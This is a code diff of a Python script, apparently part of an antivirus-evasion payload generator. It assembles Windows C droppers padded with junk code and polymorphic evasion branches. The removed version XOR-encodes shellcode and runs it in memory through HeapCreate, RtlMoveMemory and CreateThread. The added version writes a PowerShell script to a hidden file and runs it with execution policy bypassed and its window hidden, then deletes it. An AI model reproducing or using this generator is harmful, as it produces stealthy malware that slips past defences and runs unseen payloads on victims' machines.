@@ -20,65 +20,26 @@
 
 import random, string
 import sys 
+from random import shuffle
 sys.path.append("Modules/payloads/auxiliar")
-sys.path.append("Modules/payloads/encryption")
-import platform 
 import usefull
-import Multibyte_xor
-import Multibyte_xorPy3
 
-Payload = sys.argv[1]
+
+Powershell_Script = usefull.powershell_adjust(sys.argv[1]) + ";\n"
 
 Filename = sys.argv[2]
 
-Encryption = sys.argv[3]
 
-Randbufname = usefull.varname_creator()
 
-if Encryption == "1":
+Randpshvarname = usefull.varname_creator()
 
-    Payload = Payload.replace("buf",Randbufname)
+Randcmdvarname = usefull.varname_creator()
 
-if Encryption == "2":
+Randscriptname = usefull.varname_creator() + ".ps1"
 
-    Payload = Payload.splitlines()
-    Shellcode = ""
-    for line in Payload:
-        line=line.replace("unsigned char buf[]","")
-        line=line.replace(" ","")
-        line=line.replace("=","")
-        line=line.replace('"','')
-        line=line.replace('\n','')
-        line=line.replace(';','')
-        Shellcode += line
+Randfileptr = usefull.varname_creator()
 
-    py_version=platform.python_version()
-    if py_version[0] == "3":
-        Payload = Multibyte_xorPy3.Xor_stub3(Shellcode,Randbufname)    
-    else:
-        Payload = Multibyte_xor.Xor_stub2(Shellcode,Randbufname)
-
-Randgood = usefull.varname_creator()
-
-Randmem = usefull.varname_creator()
-
-Randbig = random.randrange(60000000,120000000,1000000) 	
-
-Randmaxop = usefull.varname_creator()
-
-Randcpt	= usefull.varname_creator()
-
-Randi =	usefull.varname_creator()
-
-Randlpv = usefull.varname_creator()
-
-Randhand = usefull.varname_creator()
-
-Randresult = usefull.varname_creator()
-
-Randthread = usefull.varname_creator()
-
-Randheapvar = usefull.varname_creator()
+Randattr = usefull.varname_creator()
 
 Junkcode1 = usefull.Junkmathinject(str(random.randint(1,12)))	        # Junkcode
 Junkcode2 = usefull.Junkmathinject(str(random.randint(1,12)))		# Junkcode
@@ -97,7 +58,6 @@ MorphEvasion1 = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,6))
 MorphEvasion2 = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,6)),Filename))
 MorphEvasion3 = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,6)),Filename))
  
-
 Hollow_code = ""
 Hollow_code += "#include <windows.h>\n"
 Hollow_code += "#include <stdio.h>\n"
@@ -112,18 +72,20 @@ Hollow_code += Junkcode2
 Hollow_code += MorphEvasion1
 Hollow_code += MorphEvasion2
 Hollow_code += MorphEvasion3
-Hollow_code += "HANDLE " + Randheapvar + ";LPVOID " + Randlpv + ";HANDLE " + Randhand + ";DWORD " + Randresult + ";DWORD " + Randthread + ";\n"
+Hollow_code += "char " + Randpshvarname + "[] = " + Powershell_Script 
+Hollow_code += "char " + Randcmdvarname + "[] = \"powershell -executionpolicy bypass -WindowStyle Hidden -Noexit -File " + Randscriptname +  "\";\n"
+Hollow_code += "FILE *" + Randfileptr + " = fopen(\"" + Randscriptname + "\",\"w\");\n"
+Hollow_code += "fputs(" + Randpshvarname + "," + Randfileptr + ");\n"
+Hollow_code += "fclose(" + Randfileptr + ");\n"
+Hollow_code += "DWORD " + Randattr + " = GetFileAttributes(\"" + Randscriptname + "\");\n"
+Hollow_code += "SetFileAttributes(\"" + Randscriptname + "\"," + Randattr + " + FILE_ATTRIBUTE_HIDDEN);\n"
+Hollow_code += "system(" + Randcmdvarname + ");\n"
 Hollow_code += Junkcode3
-Hollow_code += Payload
-Hollow_code += Randheapvar + " = HeapCreate(0x00040000, strlen(" + Randbufname + "), 0);\n"
-Hollow_code += Randlpv + " = HeapAlloc(" + Randheapvar + ", 0x00000008, strlen(" + Randbufname + "));\n"
-Hollow_code += "RtlMoveMemory(" + Randlpv +","+ Randbufname + ",strlen(" + Randbufname + "));\n"
-Hollow_code += Randhand + " = CreateThread(NULL,0," + Randlpv + ",NULL,0,&"+ Randthread + ");\n"
-Hollow_code += Randresult + " = WaitForSingleObject(" + Randhand + ",-1);\n" 
-Hollow_code += "}else{" + Junkcode5 + "}\n"
-Hollow_code += "}else{" + Junkcode6 + "}\n"
-Hollow_code += "}else{" + Junkcode7 + "}\n"
-Hollow_code += "}" + Junkcode4 + "}}\n"
+Hollow_code += "remove(\"" + Randscriptname + "\");\n"
+Hollow_code += "}else{" + Junkcode1 + "}\n"
+Hollow_code += "}else{" + Junkcode2 + "}\n"
+Hollow_code += "}else{" + Junkcode3 + "}\n"
+Hollow_code += "}" + Junkcode4 + "}}\n" 
 Hollow_code += "return 0;}"
 Hollow_code = Hollow_code.encode('utf-8')
 
